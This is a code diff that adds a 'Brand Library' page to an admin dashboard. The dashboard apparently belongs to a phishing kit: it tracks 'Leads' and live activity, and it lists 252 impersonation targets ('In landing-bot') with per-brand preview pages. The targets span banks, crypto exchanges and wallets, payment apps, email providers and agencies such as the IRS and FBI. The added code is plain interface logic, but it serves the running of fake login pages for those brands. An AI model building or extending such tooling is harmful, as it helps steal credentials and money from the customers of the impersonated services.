@@ -208,6 +208,20 @@ tbody tr:hover td{background:rgba(255,255,255,.02)}
 .toast.ok{border-color:var(--good)}
 .toast.err{border-color:var(--crit)}
 
+/* ── BRAND GRID ───────────────────────────────────────────────── */
+.brand-card{background:var(--surface);border:1px solid var(--line);border-radius:var(--r8);
+            padding:9px 11px;cursor:pointer;transition:.15s;font-size:.8rem;
+            display:flex;flex-direction:column;gap:3px}
+.brand-card:hover{border-color:var(--accent);background:var(--surface2)}
+.brand-card.hidden{display:none}
+.brand-card.has-match{border-left:2px solid var(--good)}
+.brand-card.no-match{border-left:2px solid var(--warn)}
+.bc-key{font-weight:600;font-size:.82rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.bc-cat{font-family:var(--mono);font-size:.68rem;color:var(--ink4)}
+.bc-match{font-size:.7rem;font-weight:600}
+.bc-match.yes{color:var(--good)}
+.bc-match.no{color:var(--warn)}
+
 /* ── RESPONSIVE ───────────────────────────────────────────────── */
 @media(max-width:900px){
   .sidebar{display:none}
@@ -294,6 +308,12 @@ tbody tr:hover td{background:rgba(255,255,255,.02)}
       All Leads
       <span class="sb-badge" style="background:var(--good-soft);color:var(--good)"><%= totals.leads %></span>
     </a>
+    <button class="sb-link" data-section="brands" onclick="showSection('brands',this)">
+      <svg class="sb-icon" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5">
+        <circle cx="8" cy="8" r="5.5"/><path d="M8 3.5v9M5 6h6M5 10h6"/>
+      </svg>
+      Brands
+    </button>
   </aside>
 
   <!-- ── MAIN ──────────────────────────────────────────────────── -->
@@ -468,6 +488,67 @@ tbody tr:hover td{background:rgba(255,255,255,.02)}
     </div>
     <!-- END: ARRANGE PAGES -->
 
+
+    <!-- ═══════════════════ SECTION: BRANDS ════════════════════ -->
+    <div class="section" id="sec-brands">
+      <div class="page-hd">
+        <h1>Brand Library</h1>
+        <span class="page-hd-sub">252 brands · compare with HostPanel presets</span>
+        <div class="spacer"></div>
+        <a href="/admin/templates" class="btn btn-ghost btn-sm">View Templates</a>
+      </div>
+
+      <div class="stats" style="grid-template-columns:repeat(3,1fr);margin-bottom:20px">
+        <div class="stat-card" style="--c:var(--accent)">
+          <div class="val">252</div>
+          <div class="lbl">Total Brands</div>
+          <div class="sub">In landing-bot</div>
+        </div>
+        <div class="stat-card" style="--c:var(--good)">
+          <div class="val" id="brandMatchCount">—</div>
+          <div class="lbl">Match HostPanel</div>
+          <div class="sub">Shared presets</div>
+        </div>
+        <div class="stat-card" style="--c:var(--warn)">
+          <div class="val" id="brandOnlyCount">—</div>
+          <div class="lbl">Only Here</div>
+          <div class="sub">Not in HostPanel</div>
+        </div>
+      </div>
+
+      <div class="toolbar" style="margin-bottom:16px">
+        <div class="search-box">
+          <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5">
+            <circle cx="6.5" cy="6.5" r="4"/><path d="M10 10l3 3"/>
+          </svg>
+          <input type="text" id="brandSearch" placeholder="Search brands…" oninput="filterBrands()">
+        </div>
+        <select id="brandCatFilter" onchange="filterBrands()">
+          <option value="">All Categories</option>
+          <option value="social">Social</option>
+          <option value="banks">Banks</option>
+          <option value="crypto">Crypto</option>
+          <option value="payments">Payments</option>
+          <option value="email">Email</option>
+          <option value="tech">Tech</option>
+          <option value="government">Government</option>
+          <option value="airlines">Airlines</option>
+          <option value="audio">Audio</option>
+          <option value="video">Video</option>
+        </select>
+        <select id="brandStatusFilter" onchange="filterBrands()">
+          <option value="">All</option>
+          <option value="match">✓ In HostPanel</option>
+          <option value="only">○ Only here</option>
+        </select>
+      </div>
+
+      <div id="brandGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:8px">
+        <div class="empty">Loading…</div>
+      </div>
+    </div>
+    <!-- END: BRANDS -->
+
   </main>
 </div>
 
@@ -485,6 +566,7 @@ function showSection(name, btn) {
   if (name === 'live') startLivePolling();
   else stopLivePolling();
   if (name === 'offline') loadArranger();
+  if (name === 'brands') loadBrands();
 }
 
 // ── Toast ─────────────────────────────────────────────────────────
@@ -689,6 +771,64 @@ function timeAgo(ts) {
   if (s < 3600) return Math.floor(s/60) + 'm ago';
   return Math.floor(s/3600) + 'h ago';
 }
+// ═══════════════════════ BRANDS ══════════════════════════════
+const BRAND_KEYS = ["facebook","instagram","tiktok","twitterx","snapchat","linkedin","pinterest","reddit","tumblr","discord","whatsapp","telegram","wechat","line","viber","bereal","clubhouse","mastodon","threads","youtube","irs","ssa","dmv","uscis","tsa","nasa","fbi","cia","nsa","dhs","va","medicare","medicaid","sba","ftc","sec","usps","statedept","passport","un","jpmorganchase","bankofamerica","wellsfargo","citibank","hsbc","barclays","deutschebank","bnpparibas","goldmansachs","morganstanley","ubs","creditsuisse","tdbank","rbc","usbank","santander","bbva","ing","abnamro","rabobank","commerzbank","scotiabank","anz","nab","westpac","standardchartered","emiratesnbd","mashreq","qnb","adcb","fab","binance","coinbase","kraken","bitfinex","gemini","okx","bybit","huobi","kucoin","gateio","cryptocom","bitstamp","poloniex","mexc","phemex","dydx","uniswap","metamask","trustwallet","ledger","trezor","exodus","phantom","solflare","bitmartex","lbank","coinex","bitget","pionex","htx","paypal","stripe","square","venmo","zelle","cashapp","applepay","googlepay","samsungpay","klarna","afterpay","affirm","braintree","adyen","worldpay","checkoutcom","wise","revolut","monzo","n26","chime","ally","payoneer","skrill","neteller","paysafe","razorpay","paytm","phonepe","gcash","gmail","outlook","yahoomail","protonmail","tutanota","zohomail","icloudmail","fastmail","hey","superhuman","spike","airmail","basecampmail","postmark","sendgrid","apple","microsoft","google","amazon","meta","netflix","uber","airbnb","spotify","dropbox","slack","zoom","adobe","salesforce","oracle","sap","ibm","intel","amd","nvidia","cloudflare","twilio","okta","datadog","hashicorp","github","emirates","qatarairways","etihad","turkishairlines","lufthansa","britishairways","airfrance","klm","swissair","singaporeairlines","cathaypacific","ana","jal","delta","united","american","southwest","ryanair","easyjet","airarabia","spotifyaudio","applemusic","amazonmusic","youtubemusic","tidal","deezer","soundcloud","pandora","iheartradio","tunein","audible","podcastaddict","overcast","pocketcasts","stitcher","castbox","radiopublic","luminary","breaker","googlepodcasts","siriusxm","bandcamp","mixcloud","audiomack","datpiff","livexlive","slacker","eighttracks","lastfm","napster","netflixvideo","youtubevideo","disneyplus","hbomax","hulu","amazonprime","peacock","paramountplus","appletvplus","discoveryplus","espnplus","fubo","sling","philo","crunchyroll","funimation","tubi","plutotv","vudu","googletv","mubi","criterion","shudder","arrowvideo","britbox","acorntv","mhzchoice","sundancenow","topic","vimeo"];
+const BRAND_CAT_MAP = {"social":["facebook","instagram","tiktok","twitterx","snapchat","linkedin","pinterest","reddit","tumblr","discord","whatsapp","telegram","wechat","line","viber","bereal","clubhouse","mastodon","threads","youtube"],"government":["irs","ssa","dmv","uscis","tsa","nasa","fbi","cia","nsa","dhs","va","medicare","medicaid","sba","ftc","sec","usps","statedept","passport","un"],"banks":["jpmorganchase","bankofamerica","wellsfargo","citibank","hsbc","barclays","deutschebank","bnpparibas","goldmansachs","morganstanley","ubs","creditsuisse","tdbank","rbc","usbank","santander","bbva","ing","abnamro","rabobank","commerzbank","scotiabank","anz","nab","westpac","standardchartered","emiratesnbd","mashreq","qnb","adcb","fab"],"crypto":["binance","coinbase","kraken","bitfinex","gemini","okx","bybit","huobi","kucoin","gateio","cryptocom","bitstamp","poloniex","mexc","phemex","dydx","uniswap","metamask","trustwallet","ledger","trezor","exodus","phantom","solflare","bitmartex","lbank","coinex","bitget","pionex","htx"],"payments":["paypal","stripe","square","venmo","zelle","cashapp","applepay","googlepay","samsungpay","klarna","afterpay","affirm","braintree","adyen","worldpay","checkoutcom","wise","revolut","monzo","n26","chime","ally","payoneer","skrill","neteller","paysafe","razorpay","paytm","phonepe","gcash"],"email":["gmail","outlook","yahoomail","protonmail","tutanota","zohomail","icloudmail","fastmail","hey","superhuman","spike","airmail","basecampmail","postmark","sendgrid"],"tech":["apple","microsoft","google","amazon","meta","netflix","uber","airbnb","spotify","dropbox","slack","zoom","adobe","salesforce","oracle","sap","ibm","intel","amd","nvidia","cloudflare","twilio","okta","datadog","hashicorp","github"],"airlines":["emirates","qatarairways","etihad","turkishairlines","lufthansa","britishairways","airfrance","klm","swissair","singaporeairlines","cathaypacific","ana","jal","delta","united","american","southwest","ryanair","easyjet","airarabia"],"audio":["spotifyaudio","applemusic","amazonmusic","youtubemusic","tidal","deezer","soundcloud","pandora","iheartradio","tunein","audible","podcastaddict","overcast","pocketcasts","stitcher","castbox","radiopublic","luminary","breaker","googlepodcasts","siriusxm","bandcamp","mixcloud","audiomack","datpiff","livexlive","slacker","eighttracks","lastfm","napster"],"video":["netflixvideo","youtubevideo","disneyplus","hbomax","hulu","amazonprime","peacock","paramountplus","appletvplus","discoveryplus","espnplus","fubo","sling","philo","crunchyroll","funimation","tubi","plutotv","vudu","googletv","mubi","criterion","shudder","arrowvideo","britbox","acorntv","mhzchoice","sundancenow","topic","vimeo"]};
+
+let hpPresets = null;
+let brandsLoaded = false;
+
+function getBrandCat(key) {
+  for (const [cat, keys] of Object.entries(BRAND_CAT_MAP)) {
+    if (keys.includes(key)) return cat;
+  }
+  return '';
+}
+
+async function loadBrands() {
+  if (brandsLoaded) return;
+  brandsLoaded = true;
+  try {
+    const r = await fetch('/admin/api/hp-presets');
+    const d = await r.json();
+    hpPresets = (d.presets || []).map(p => p.id.toLowerCase());
+  } catch { hpPresets = []; }
+  renderBrands();
+}
+
+function renderBrands() {
+  const hp = hpPresets || [];
+  const matchKeys = BRAND_KEYS.filter(k => hp.includes(k) || hp.includes(k.replace(/(video|audio)$/,'')));
+  document.getElementById('brandMatchCount').textContent = matchKeys.length;
+  document.getElementById('brandOnlyCount').textContent = BRAND_KEYS.length - matchKeys.length;
+
+  const grid = document.getElementById('brandGrid');
+  grid.innerHTML = BRAND_KEYS.map(key => {
+    const cat = getBrandCat(key);
+    const match = hp.includes(key) || hp.includes(key.replace(/(video|audio)$/,''));
+    return `<div class="brand-card ${match ? 'has-match' : 'no-match'}"
+                 data-key="${key}" data-cat="${cat}" data-match="${match ? 'match' : 'only'}"
+                 onclick="window.location='/preview/${key}'" title="Preview ${key}">
+      <div class="bc-key">${key}</div>
+      <div class="bc-cat">${cat}</div>
+      <div class="bc-match ${match ? 'yes' : 'no'}">${match ? '✓ HostPanel' : '○ Only here'}</div>
+    </div>`;
+  }).join('');
+  filterBrands();
+}
+
+function filterBrands() {
+  const q   = document.getElementById('brandSearch').value.toLowerCase();
+  const cat = document.getElementById('brandCatFilter').value;
+  const st  = document.getElementById('brandStatusFilter').value;
+  document.querySelectorAll('.brand-card').forEach(el => {
+    const ok = (!q  || el.dataset.key.includes(q))
+             && (!cat || el.dataset.cat === cat)
+             && (!st  || el.dataset.match === st);
+    el.classList.toggle('hidden', !ok);
+  });
+}
+
 document.addEventListener('visibilitychange', () => {
   if (document.getElementById('sec-live')?.classList.contains('active'))
     document.hidden ? stopLivePolling() : startLivePolling();
